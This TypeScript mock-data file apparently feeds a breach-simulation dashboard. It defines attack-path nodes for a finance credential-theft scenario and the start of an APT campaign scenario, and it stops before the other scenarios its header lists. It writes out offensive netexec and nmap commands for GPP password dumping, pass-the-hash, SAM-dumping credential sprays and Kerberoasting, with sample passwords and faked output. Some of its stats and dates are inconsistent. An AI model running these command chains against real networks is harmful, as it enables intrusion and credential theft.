/**
 * Mock Attack Path Data – Four real-world chaining attack scenarios
 *
 * Scenario 1 – "Finance Dept Credential Theft"     5 endpoints,  7 actions
 * Scenario 2 – "APT Mid-Enterprise Campaign"       15 endpoints, 22 actions  ← default
 * Scenario 3 – "Large Enterprise Full Breach"      50 endpoints, 40 actions
 * Scenario 4 – "APT29-Style Domain Takeover"        8 endpoints, 10 actions
 *
 * Each scenario uses actions from the real threat arsenal:
 *   - nmap  (TCP SYN / FIN / Connect scans)
 *   - netexec SMB / WMI / LDAP / MSSQL / SSH / RDP / FTP / NFS
 *   - nuclei (CVE web exploits)
 *   - http-query (admin interface probing)
 */

import type { AttackPathData } from './attackPathUtils';

/**
 * PoC compile-time flag — always true so mock simulations/scenarios appear
 * in every deployment without needing the backend feature flag.
 * Set to false to disable PoC mock data globally.
 */
export const IS_ATTACK_PATH_POC = true;

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 1 – Finance Department Credential Theft  (5 endpoints, 7 actions)
// ─────────────────────────────────────────────────────────────────────────────
//
//  Entry: spear-phishing → FINANCE-WS-01
//  Chain: AV enum → GPP credential dump → SMB lateral to FILE-SRV-01 →
//         WMI remote exec → LDAP Kerberoasting on DC-01 →
//         SSH brute on BACKUP-LX-01 (blocked)
//  Untouched: DEV-MAC-02 (discovered but not reached)
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_5EP: AttackPathData = {
  attack_path_nodes: [
    // ── ASSET nodes ──────────────────────────────────────────────────────────
    {
      node_id: 's1-ep01',
      node_type: 'ASSET',
      node_label: 'FINANCE-WS-01',
      node_hostname: 'FINANCE-WS-01',
      node_ip: '192.168.10.101',
      node_platform: 'Windows 10',
      node_status: 'undetected',
      node_user_privileges: 'DOMAIN\\jsmith (User)',
      node_accessed_files: ['C:\\Users\\jsmith\\Documents\\budget_Q4.xlsx', 'C:\\Users\\jsmith\\Desktop\\passwords.txt'],
      node_credentials_found: ['jsmith:Passw0rd!', 'svc_backup:Backup@2024'],
      node_zone: 'Finance LAN',
      node_subnet: '192.168.10.0/24',
      node_is_entry_point: true,
      node_is_pivot: true,
      node_agents: ['sentinel_one', 'openaev'],
    },
    {
      node_id: 's1-ep02',
      node_type: 'ASSET',
      node_label: 'FILE-SRV-01',
      node_hostname: 'FILE-SRV-01',
      node_ip: '192.168.10.10',
      node_platform: 'Windows Server 2019',
      node_status: 'undetected',
      node_user_privileges: 'DOMAIN\\svc_backup (Service Account)',
      node_accessed_files: ['\\\\FILE-SRV-01\\Finance\\Payroll_2024.xlsx', '\\\\FILE-SRV-01\\HR\\Contracts\\'],
      node_credentials_found: [],
      node_zone: 'Finance LAN',
      node_subnet: '192.168.10.0/24',
      node_is_pivot: true,
      node_agents: ['palo_alto', 'openaev'],
    },
    {
      node_id: 's1-ep03',
      node_type: 'ASSET',
      node_label: 'DC-01',
      node_hostname: 'DC-01',
      node_ip: '192.168.1.5',
      node_platform: 'Windows Server 2022',
      node_status: 'undetected',
      node_user_privileges: 'DOMAIN\\Administrator (Domain Admin)',
      node_accessed_files: [],
      node_credentials_found: ['Administrator:$krb5tgs$23$*svc_mssql*DOMAIN.LOCAL*...'],
      node_zone: 'Domain',
      node_subnet: '192.168.1.0/24',
      node_agents: ['openaev'],
    },
    {
      node_id: 's1-ep04',
      node_type: 'ASSET',
      node_label: 'DEV-MAC-02',
      node_hostname: 'DEV-MAC-02',
      node_ip: '192.168.10.150',
      node_platform: 'macOS Sonoma 14.4',
      node_status: 'pending',
      node_zone: 'Finance LAN',
      node_subnet: '192.168.10.0/24',
      node_untouched: true,
      node_agents: ['sentinel_one'],
    },
    {
      node_id: 's1-ep05',
      node_type: 'ASSET',
      node_label: 'BACKUP-LX-01',
      node_hostname: 'BACKUP-LX-01',
      node_ip: '192.168.10.20',
      node_platform: 'Ubuntu 22.04 LTS',
      node_status: 'prevented',
      node_zone: 'Finance LAN',
      node_subnet: '192.168.10.0/24',
      node_agents: ['palo_alto', 'sentinel_one', 'openaev'],
    },

    // ── ACTION nodes ──────────────────────────────────────────────────────────
    {
      node_id: 's1-a01',
      node_type: 'ACTION',
      node_label: 'Nmap TCP SYN Scan',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan',
      node_command: 'nmap -sS -sV -T4 -p 135,139,445,3389,5985',
      node_arguments: '--script=default,version --host-timeout=30s 192.168.10.101',
      node_executed_at: '2025-01-15T08:02:11Z',
      node_ip: '192.168.10.101',
      node_agent: 'openaev',
      node_expectations: [{ expectation_id: 'e1', expectation_type: 'DETECTION', expectation_status: 'FAILED', expectation_score: 0, expectation_expected_score: 100 }],
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for FINANCE-WS-01 (192.168.10.101)
Host is up (0.0012s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 00:50:56:AB:12:CD (VMware)
Nmap done: 1 IP address (1 host up) scanned in 2.34 seconds`,
    },
    {
      node_id: 's1-a02',
      node_type: 'ACTION',
      node_label: 'SMB AV Enumeration',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB enum_av',
      node_executed_at: '2025-01-15T08:04:33Z',
      node_ip: '192.168.10.101',
      node_agent: 'sentinel_one',
      node_terminal_output: `SMB   192.168.10.101  445    FINANCE-WS-01  [*] Windows 10.0 Build 19041 x64 (name:FINANCE-WS-01) (domain:CORP) (signing:True) (SMBv1:False)
SMB   192.168.10.101  445    FINANCE-WS-01  [+] CORP\\jsmith:Passw0rd! (Pwn3d!)
SMB   192.168.10.101  445    FINANCE-WS-01  [*] Enumerating AV solutions...
SMB   192.168.10.101  445    FINANCE-WS-01  [+] No AV solution detected (registry key empty)
SMB   192.168.10.101  445    FINANCE-WS-01  [*] Windows Defender status: Disabled
SMB   192.168.10.101  445    FINANCE-WS-01  [+] Endpoint is unprotected`,
    },
    {
      node_id: 's1-a03',
      node_type: 'ACTION',
      node_label: 'SMB GPP Password Dump',
      node_status: 'detected',
      node_payload_name: 'netexec – SMB gpp_password',
      node_command: 'netexec smb 192.168.10.101',
      node_arguments: '-u "jsmith" -p "Passw0rd!" -M gpp_password',
      node_executed_at: '2025-01-15T08:07:45Z',
      node_ip: '192.168.10.101',
      node_agent: 'openaev',
      node_credentials_found: ['jsmith:Passw0rd!', 'svc_backup:Backup@2024'],
      node_expectations: [{ expectation_id: 'e2', expectation_type: 'DETECTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }],
      node_terminal_output: `[*] Searching for Group Policy Preferences files...
[*] Found SYSVOL path: \\\\CORP.LOCAL\\SYSVOL\\Corp.local\\Policies\\
[*] Scanning for Groups.xml / Services.xml / Scheduledtasks.xml ...
[+] Found \\\\Corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml
[*] Decrypting cPassword (AES-256 CBC, static MS key)...
[+] Credentials recovered:
    Username: jsmith
    Password: Passw0rd!
    Domain: CORP
[+] Found \\\\Corp.local\\Policies\\{2345ABCD-0000-ABCD-0000-000000000002}\\MACHINE\\Preferences\\Services\\Services.xml
[+] Additional credentials:
    Username: svc_backup
    Password: Backup@2024
    Domain: CORP
[+] Adding 2 credentials to credential store...
[!] DETECTION: SIEM alert triggered — GPP credential access logged by Windows Event ID 4663`,
    },
    {
      node_id: 's1-a04',
      node_type: 'ACTION',
      node_label: 'SMB Pass-the-Hash Lateral',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB pass-the-hash',
      node_command: 'netexec smb 192.168.10.10',
      node_arguments: '-u "svc_backup" -H "aad3b435b51404eeaad3b435b51404ee:<NTLM>" --shares -M spider_plus',
      node_executed_at: '2025-01-15T08:12:01Z',
      node_ip: '192.168.10.10',
      node_agent: 'palo_alto',
      node_user_privileges: 'DOMAIN\\svc_backup (Service Account)',
      node_accessed_files: ['\\\\FILE-SRV-01\\Finance\\Payroll_2024.xlsx', '\\\\FILE-SRV-01\\HR\\Contracts\\'],
      node_terminal_output: `SMB   192.168.10.10   445    FILE-SRV-01    [*] Windows Server 2019 Build 17763 x64 (name:FILE-SRV-01) (domain:CORP) (signing:True) (SMBv1:False)
SMB   192.168.10.10   445    FILE-SRV-01    [+] CORP\\svc_backup:<NTLM_HASH> (Pwn3d!)
SMB   192.168.10.10   445    FILE-SRV-01    [*] Enumerating shares...
SMB   192.168.10.10   445    FILE-SRV-01    Share        Permissions  Remark
SMB   192.168.10.10   445    FILE-SRV-01    -----        -----------  ------
SMB   192.168.10.10   445    FILE-SRV-01    ADMIN$       READ,WRITE   Remote Admin
SMB   192.168.10.10   445    FILE-SRV-01    C$           READ,WRITE   Default share
SMB   192.168.10.10   445    FILE-SRV-01    Finance      READ,WRITE   Finance Documents
SMB   192.168.10.10   445    FILE-SRV-01    HR           READ         HR Documents
SMB   192.168.10.10   445    FILE-SRV-01    [+] Downloading: \\\\FILE-SRV-01\\Finance\\Payroll_2024.xlsx
SMB   192.168.10.10   445    FILE-SRV-01    [+] Downloaded 2.3 MB successfully
SMB   192.168.10.10   445    FILE-SRV-01    [+] Downloading: \\\\FILE-SRV-01\\HR\\Contracts\\ (14 files)`,
    },
    {
      node_id: 's1-a05',
      node_type: 'ACTION',
      node_label: 'WMI Remote Code Exec',
      node_status: 'undetected',
      node_payload_name: 'netexec – WMI command exec',
      node_executed_at: '2025-01-15T08:15:22Z',
      node_ip: '192.168.10.10',
      node_agent: 'openaev',
      node_terminal_output: `WMI   192.168.10.10   135    FILE-SRV-01    [*] Connecting via WMI to 192.168.10.10
WMI   192.168.10.10   135    FILE-SRV-01    [+] CORP\\svc_backup:Backup@2024 Auth OK
WMI   192.168.10.10   135    FILE-SRV-01    [*] Executing: cmd.exe /c whoami /all
WMI   192.168.10.10   135    FILE-SRV-01    [+] Output:
USER INFORMATION
----------------
User Name            SID
==================== ========================================
corp\\svc_backup      S-1-5-21-1234567890-0987654321-11223344-1106

GROUP INFORMATION
-----------------
Group Name                              Type             SID
======================================= ================ ============================
CORP\\Backup Operators                   Alias            S-1-5-32-551
NT AUTHORITY\\Authenticated Users        Well-known group S-1-5-11

WMI   192.168.10.10   135    FILE-SRV-01    [*] Copying agent to \\\\FILE-SRV-01\\C$\\Windows\\Temp\\svchost32.exe
WMI   192.168.10.10   135    FILE-SRV-01    [+] Agent deployed successfully — callback established`,
    },
    {
      node_id: 's1-a06',
      node_type: 'ACTION',
      node_label: 'LDAP Kerberoasting',
      node_status: 'undetected',
      node_payload_name: 'netexec – LDAP Kerberoasting',
      node_executed_at: '2025-01-15T08:19:55Z',
      node_ip: '192.168.1.5',
      node_agent: 'openaev',
      node_credentials_found: ['$krb5tgs$23$*svc_mssql*DOMAIN.LOCAL*...'],
      node_terminal_output: `LDAP  192.168.1.5     389    DC-01          [*] Querying DC-01 for Kerberoastable accounts
LDAP  192.168.1.5     389    DC-01          [+] Found 3 kerberoastable accounts
LDAP  192.168.1.5     389    DC-01          svc_mssql@CORP.LOCAL (AES256: False)
LDAP  192.168.1.5     389    DC-01          svc_backup@CORP.LOCAL (AES256: False)
LDAP  192.168.1.5     389    DC-01          svc_web@CORP.LOCAL (AES256: True)
LDAP  192.168.1.5     389    DC-01          [*] Requesting TGS tickets...
LDAP  192.168.1.5     389    DC-01          [+] Saved 3 TGS tickets to ./kerberoast/
$krb5tgs$23$*svc_mssql*CORP.LOCAL*svc_mssql/DC-01.corp.local*a34b8f2c19e4...
[HASH TRUNCATED — RC4-HMAC, crackable offline with hashcat -m 13100]`,
    },
    {
      node_id: 's1-a07',
      node_type: 'ACTION',
      node_label: 'SSH Brute Force',
      node_status: 'prevented',
      node_payload_name: 'netexec – SSH brute force',
      node_executed_at: '2025-01-15T08:22:10Z',
      node_ip: '192.168.10.20',
      node_agent: 'palo_alto',
      node_expectations: [{ expectation_id: 'e3', expectation_type: 'PREVENTION', expectation_status: 'SUCCEEDED', expectation_score: 100, expectation_expected_score: 100 }],
      node_terminal_output: `[*] Starting SSH brute force on 192.168.10.20:22
[*] Trying admin:admin ... FAILED
[*] Trying root:root ... FAILED
[*] Trying backup:Backup@2024 ... FAILED
[!] Connection timeout after 3 attempts — host may have blocked our IP
[!] IDS ALERT: SSH brute force detected by SIEM — attack PREVENTED
[-] Unable to establish SSH session to 192.168.10.20
[-] Fail2Ban rule triggered: IP 192.168.1.5 blocked for 3600 seconds`,
    },
    // ── Multi-endpoint spray (hits FINANCE-WS-01 and FILE-SRV-01 simultaneously) ──
    {
      node_id: 's1-a-spray',
      node_type: 'ACTION',
      node_label: 'Netexec SMB Credential Spray',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB spray',
      node_executed_at: '2024-11-15T08:25:00Z',
      node_user_privileges: 'DOMAIN\\svc_backup → DOMAIN\\Administrator',
      node_agent: 'sentinel_one',
      node_accessed_files: ['C:\\Windows\\NTDS\\ntds.dit'],
      node_credentials_found: ['Administrator:$HASH$ntlm...'],
      node_hostname: 'Multiple endpoints',
      node_ip: '192.168.10.0/24',
      node_chain_previous: 's1-a03',
      node_terminal_output: `netexec smb 192.168.10.0/24 -u svc_backup -p 'Backup@2024' --sam\n[+] 192.168.10.101 FINANCE-WS-01\\svc_backup:Backup@2024 (Pwn3d!)\n[+] 192.168.10.10  FILE-SRV-01\\svc_backup:Backup@2024 (Pwn3d!)\n[-] 192.168.10.5   DC-01: STATUS_LOGON_FAILURE\n[+] SAM dumped: 3 credentials from FINANCE-WS-01\n[+] SAM dumped: 5 credentials from FILE-SRV-01\nRuntime: 4.2s | 3 hosts sprayed`,
    },
    // Nmap discovery — covers remaining Finance LAN endpoints
    {
      node_id: 's1-a-nmap-bulk',
      node_type: 'ACTION',
      node_label: 'Nmap Finance LAN Discovery',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan (Finance LAN)',
      node_executed_at: '2025-01-15T07:58:00Z',
      node_ip: '192.168.10.0/24',
      node_agent: 'openaev',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-15 07:58 UTC
Nmap scan report for 192.168.10.10 (FILE-SRV-01)
Host is up (0.0009s latency).
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019
3389/tcp  filtered ms-wbt-server

Nmap scan report for 192.168.1.5 (DC-01)
Host is up (0.0007s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds  Windows Server 2022
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP

Nmap scan report for 192.168.10.150 (DEV-MAC-02)
Host is up (0.0011s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
5900/tcp open  vnc

Nmap scan report for 192.168.10.20 (BACKUP-LX-01)
Host is up (0.0013s latency).
PORT    STATE SERVICE
22/tcp  open  ssh
873/tcp open  rsync

Nmap done: 254 IP addresses (4 hosts up) scanned in 19.7 seconds`,
    },
    // ── Multi-agent demo: same Nmap scan on FINANCE-WS-01 from SentinelOne agent ──
    // This consecutive same-payload run demonstrates the multi-agent feed grouping.
    {
      node_id: 's1-a01-s1',
      node_type: 'ACTION',
      node_label: 'Nmap TCP SYN Scan',
      node_status: 'undetected',
      node_payload_name: 'nmap – TCP SYN Scan',
      node_command: 'nmap -sS -sV -T4 -p 135,139,445,3389,5985',
      node_arguments: '--script=default,version --host-timeout=30s 192.168.10.101',
      node_executed_at: '2025-01-15T08:02:35Z',
      node_ip: '192.168.10.101',
      node_hostname: 'FINANCE-WS-01',
      node_agent: 'sentinel_one',
      node_terminal_output: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for FINANCE-WS-01 (192.168.10.101)
Host is up (0.0011s latency).
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds`,
    },
    // ── Multi-agent demo: same SMB pass-the-hash on FILE-SRV-01 from OpenAEV agent ──
    {
      node_id: 's1-a04-oa',
      node_type: 'ACTION',
      node_label: 'SMB Pass-the-Hash Lateral',
      node_status: 'undetected',
      node_payload_name: 'netexec – SMB pass-the-hash',
      node_command: 'netexec smb 192.168.10.10',
      node_arguments: '-u "svc_backup" -H "aad3b435b51404eeaad3b435b51404ee:<NTLM>" --shares -M spider_plus',
      node_executed_at: '2025-01-15T08:12:30Z',
      node_ip: '192.168.10.10',
      node_hostname: 'FILE-SRV-01',
      node_agent: 'openaev',
      node_user_privileges: 'DOMAIN\\svc_backup (Service Account)',
      node_terminal_output: `SMB   192.168.10.10   445    FILE-SRV-01    [*] Windows Server 2019 (name:FILE-SRV-01) (domain:CORP)
SMB   192.168.10.10   445    FILE-SRV-01    [+] CORP\\svc_backup:<NTLM_HASH> (Pwn3d!)
SMB   192.168.10.10   445    FILE-SRV-01    [*] Enumerating shares...
SMB   192.168.10.10   445    FILE-SRV-01    [+] Finance READ,WRITE`,
    },
  ],

  attack_path_edges: [
    // chain_flow: linear action chain
    { edge_id: 's1-c1', edge_source: 's1-a01', edge_target: 's1-a02', edge_type: 'chain_flow' },
    { edge_id: 's1-c2', edge_source: 's1-a02', edge_target: 's1-a03', edge_type: 'chain_flow' },
    { edge_id: 's1-c3', edge_source: 's1-a03', edge_target: 's1-a04', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 's1-c4', edge_source: 's1-a04', edge_target: 's1-a05', edge_type: 'chain_flow' },
    { edge_id: 's1-c5', edge_source: 's1-a05', edge_target: 's1-a06', edge_type: 'chain_flow', edge_label: 'pivot to DC' },
    { edge_id: 's1-c6', edge_source: 's1-a06', edge_target: 's1-a07', edge_type: 'chain_flow', edge_label: 'lateral' },

    // asset_link: action → target endpoint
    { edge_id: 's1-l1', edge_source: 's1-a01', edge_target: 's1-ep01', edge_type: 'asset_link' },
    { edge_id: 's1-l2', edge_source: 's1-a02', edge_target: 's1-ep01', edge_type: 'asset_link' },
    { edge_id: 's1-l3', edge_source: 's1-a03', edge_target: 's1-ep01', edge_type: 'asset_link' },
    { edge_id: 's1-l4', edge_source: 's1-a04', edge_target: 's1-ep02', edge_type: 'asset_link' },
    { edge_id: 's1-l5', edge_source: 's1-a05', edge_target: 's1-ep02', edge_type: 'asset_link' },
    { edge_id: 's1-l6', edge_source: 's1-a06', edge_target: 's1-ep03', edge_type: 'asset_link' },
    { edge_id: 's1-l7', edge_source: 's1-a07', edge_target: 's1-ep05', edge_type: 'asset_link' },
    { edge_id: 's1-disc01', edge_source: 's1-ep01', edge_target: 's1-ep04', edge_type: 'discovery', edge_label: 'nmap scan' },
    // Spray: branch from s1-a03, hits both FINANCE-WS-01 and FILE-SRV-01
    { edge_id: 's1-spray-chain', edge_source: 's1-a03', edge_target: 's1-a-spray', edge_type: 'chain_flow', edge_label: 'credential reuse' },
    { edge_id: 's1-spray-ep01', edge_source: 's1-a-spray', edge_target: 's1-ep01', edge_type: 'asset_link' },
    { edge_id: 's1-spray-ep02', edge_source: 's1-a-spray', edge_target: 's1-ep02', edge_type: 'asset_link' },
    { edge_id: 's1-nmap-bulk-ep02', edge_source: 's1-a-nmap-bulk', edge_target: 's1-ep02', edge_type: 'asset_link' },
    { edge_id: 's1-nmap-bulk-ep03', edge_source: 's1-a-nmap-bulk', edge_target: 's1-ep03', edge_type: 'asset_link' },
    { edge_id: 's1-nmap-bulk-ep04', edge_source: 's1-a-nmap-bulk', edge_target: 's1-ep04', edge_type: 'asset_link' },
    { edge_id: 's1-nmap-bulk-ep05', edge_source: 's1-a-nmap-bulk', edge_target: 's1-ep05', edge_type: 'asset_link' },
    // Multi-agent demo edges
    { edge_id: 's1-a01s1-chain', edge_source: 's1-a01', edge_target: 's1-a01-s1', edge_type: 'chain_flow' },
    { edge_id: 's1-a01s1-ep01', edge_source: 's1-a01-s1', edge_target: 's1-ep01', edge_type: 'asset_link' },
    { edge_id: 's1-a04oa-chain', edge_source: 's1-a04', edge_target: 's1-a04-oa', edge_type: 'chain_flow' },
    { edge_id: 's1-a04oa-ep02', edge_source: 's1-a04-oa', edge_target: 's1-ep02', edge_type: 'asset_link' },
  ],

  attack_path_stats: {
    stats_prevented: 1,
    stats_detected: 1,
    stats_undetected: 6,
    stats_pending: 0,
    stats_total_actions: 9,
    stats_executed_actions: 9,
    stats_captured_endpoints: 3,
    stats_captured_files: 3,
    stats_captured_credentials: 2,
    stats_captured_users: 1,
    stats_captured_cves: 1,
  },

  attack_path_definitions: [
    { path_id: 'p1', path_name: 'Credential Theft Chain', path_color: '#f44336', node_ids: ['s1-ep01', 's1-ep02', 's1-ep03'], path_outcome: 'success',
      path_segment_reasons: { 's1-ep01->s1-ep02': 'Credentials Harvested', 's1-ep02->s1-ep03': 'Pass-the-Hash' },
      path_segment_details: {
        's1-ep01->s1-ep02': { trigger_event: 'User Login Event', condition: 'Valid domain credentials found in memory (LSASS dump)', action: 'Credential Dumping (Mimikatz)', tactic: 'Credential Access', technique: 'T1003.001 – LSASS Memory' },
        's1-ep02->s1-ep03': { trigger_event: 'Authentication Attempt', condition: 'NTLM hash available AND SMB port 445 open', action: 'Pass-the-Hash via SMB', tactic: 'Lateral Movement', technique: 'T1550.002 – Pass the Hash' },
      },
    },
    { path_id: 'p2', path_name: 'Dev Machine Pivot', path_color: '#ff9800', node_ids: ['s1-ep01', 's1-ep04'], path_outcome: 'success',
      path_segment_reasons: { 's1-ep01->s1-ep04': 'Port 22 Open (SSH)' },
      path_segment_details: {
        's1-ep01->s1-ep04': { trigger_event: 'SSH Service Discovered', condition: 'Port 22 open AND SSH private key found on initial host', action: 'SSH Lateral Movement', tactic: 'Lateral Movement', technique: 'T1021.004 – Remote Services: SSH' },
      },
    },
    // s1-ep05 is untouched - belongs to no path
  ],
};

// ─────────────────────────────────────────────────────────────────────────────
// SCENARIO 2 – APT Mid-Enterprise Campaign  (15 endpoints, 22 actions)
// ─────────────────────────────────────────────────────────────────────────────
//
//  Zones: DMZ (WEB-SRV-01, MAIL-SRV-01, VPN-GW-01) │ Corporate (WS-01–05,
//         PRINT-SRV-01) │ Server Farm (APP-SRV-01, DB-SRV-01, AD-01) │
//         Management (JUMP-HOST-01, MGMT-WS-01, BACKUP-01)
//
//  Entry : External nmap + Nuclei Log4Shell on WEB-SRV-01 (DMZ)
//  Pivot : WEB-SRV-01 → VPN-GW-01 → corporate workstations → print server
//           → app/db servers → DC → jump host → management WS
//  Blocked: BACKUP-01 (SSH + NFS both prevented)
// ─────────────────────────────────────────────────────────────────────────────
export const MOCK_SCENARIO_15EP: AttackPathData = {
  attack_path_nodes: [
    // ── ASSET nodes ──────────────────────────────────────────────────────────
    { node_id: 's2-ep01', node_type: 'ASSET', node_label: 'WEB-SRV-01', node_hostname: 'WEB-SRV-01', node_ip: '10.0.1.10', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'www-data → root (privesc)', node_accessed_files: ['/var/www/html/config.php', '/etc/passwd'], node_credentials_found: ['tomcat:s3cr3t@dm1n'], node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_is_entry_point: true, node_is_pivot: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 's2-ep02', node_type: 'ASSET', node_label: 'MAIL-SRV-01', node_hostname: 'MAIL-SRV-01', node_ip: '10.0.1.15', node_platform: 'Debian 10 (Buster)', node_status: 'detected', node_user_privileges: 'www-data (partial)', node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_agents: ['openaev'], },
    { node_id: 's2-ep03', node_type: 'ASSET', node_label: 'VPN-GW-01', node_hostname: 'VPN-GW-01', node_ip: '10.0.1.5', node_platform: 'CentOS 7', node_status: 'undetected', node_user_privileges: 'vpnuser → root', node_accessed_files: ['/etc/openvpn/server.conf', '/home/vpnuser/.ssh/authorized_keys'], node_credentials_found: [], node_zone: 'DMZ', node_subnet: '10.0.1.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 's2-ep04', node_type: 'ASSET', node_label: 'CORP-WS-01', node_hostname: 'CORP-WS-01', node_ip: '10.0.10.101', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\acct.harris (User)', node_accessed_files: ['C:\\Finance\\Q3_Report.xlsx'], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one'], },
    { node_id: 's2-ep05', node_type: 'ASSET', node_label: 'CORP-WS-02', node_hostname: 'CORP-WS-02', node_ip: '10.0.10.102', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\hr.miller (User)', node_accessed_files: [], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's2-ep06', node_type: 'ASSET', node_label: 'CORP-WS-03', node_hostname: 'CORP-WS-03', node_ip: '10.0.10.103', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\it.chen (Local Admin)', node_accessed_files: ['C:\\Users\\it.chen\\Desktop\\server_passwords.kdbx'], node_credentials_found: ['CORP\\svc_deploy:Deploy2024!'], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['palo_alto'], },
    { node_id: 's2-ep07', node_type: 'ASSET', node_label: 'CORP-WS-04', node_hostname: 'CORP-WS-04', node_ip: '10.0.10.104', node_platform: 'Windows 10 Pro', node_status: 'detected', node_user_privileges: 'CORP\\mgmt.jones (User)', node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['sentinel_one'], },
    { node_id: 's2-ep08', node_type: 'ASSET', node_label: 'CORP-WS-05', node_hostname: 'CORP-WS-05', node_ip: '10.0.10.105', node_platform: 'Windows 10 Pro', node_status: 'undetected', node_user_privileges: 'CORP\\fin.taylor (User)', node_accessed_files: ['C:\\Finance\\Payroll_2024.xlsx'], node_credentials_found: [], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_agents: ['palo_alto'], },
    { node_id: 's2-ep09', node_type: 'ASSET', node_label: 'PRINT-SRV-01', node_hostname: 'PRINT-SRV-01', node_ip: '10.0.10.20', node_platform: 'Windows Server 2016', node_status: 'undetected', node_user_privileges: 'CORP\\svc_print (Service Account)', node_accessed_files: ['C:\\Windows\\System32\\spool\\drivers\\'], node_credentials_found: ['CORP\\svc_mssql:Sql@2024Svc'], node_zone: 'Corp LAN', node_subnet: '10.0.10.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'openaev'], },
    { node_id: 's2-ep10', node_type: 'ASSET', node_label: 'APP-SRV-01', node_hostname: 'APP-SRV-01', node_ip: '10.0.20.10', node_platform: 'RHEL 8.6', node_status: 'undetected', node_user_privileges: 'appuser → root', node_accessed_files: ['/opt/app/config/db.conf', '/opt/app/logs/app.log'], node_credentials_found: ['mysql_root:R00tM3@Prod'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_is_pivot: true, node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 's2-ep11', node_type: 'ASSET', node_label: 'DB-SRV-01', node_hostname: 'DB-SRV-01', node_ip: '10.0.20.15', node_platform: 'Ubuntu 20.04 LTS', node_status: 'undetected', node_user_privileges: 'mysql → root', node_accessed_files: ['/var/lib/mysql/', '/etc/mysql/mysql.conf.d/mysqld.cnf'], node_credentials_found: ['SA:Admin@123', 'app_user:AppPass2024'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's2-ep12', node_type: 'ASSET', node_label: 'AD-01 (DC)', node_hostname: 'AD-01', node_ip: '10.0.20.5', node_platform: 'Windows Server 2022', node_status: 'undetected', node_user_privileges: 'CORP\\Administrator (Domain Admin)', node_accessed_files: [], node_credentials_found: ['CORP\\Administrator:$HASH$...', 'All 347 domain accounts extracted (NTDS.dit)'], node_zone: 'Server VLAN', node_subnet: '10.0.20.0/24', node_agents: ['palo_alto', 'sentinel_one', 'openaev'], },
    { node_id: 's2-ep13', node_type: 'ASSET', node_label: 'JUMP-HOST-01', node_hostname: 'JUMP-HOST-01', node_ip: '10.0.30.10', node_platform: 'Windows Server 2019', node_status: 'undetected', node_user_privileges: 'CORP\\svc_jumphost (Admin)', node_accessed_files: [], node_credentials_found: [], node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto', 'openaev'], },
    { node_id: 's2-ep14', node_type: 'ASSET', node_label: 'MGMT-WS-01', node_hostname: 'MGMT-WS-01', node_ip: '10.0.30.101', node_platform: 'Windows 10 Enterprise', node_status: 'undetected', node_user_privileges: 'CORP\\mgmt.admin (Domain Admin)', node_accessed_files: ['C:\\Users\\mgmt.admin\\Documents\\network_map.vsd'], node_credentials_found: ['CORP\\mgmt.admin:Sup3rS3cr3t!'], node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['sentinel_one', 'openaev'], },
    { node_id: 's2-ep15', node_type: 'ASSET', node_label: 'BACKUP-01', node_hostname: 'BACKUP-01', node_ip: '10.0.30.20', node_platform: 'Ubuntu 22.04 LTS', node_status: 'prevented', node_zone: 'Domain', node_subnet: '10.0.30.0/24', node_agents: ['palo_alto', 'sentinel_one'], },

    // ── ACTION nodes ──────────────────────────────────────────────────────────
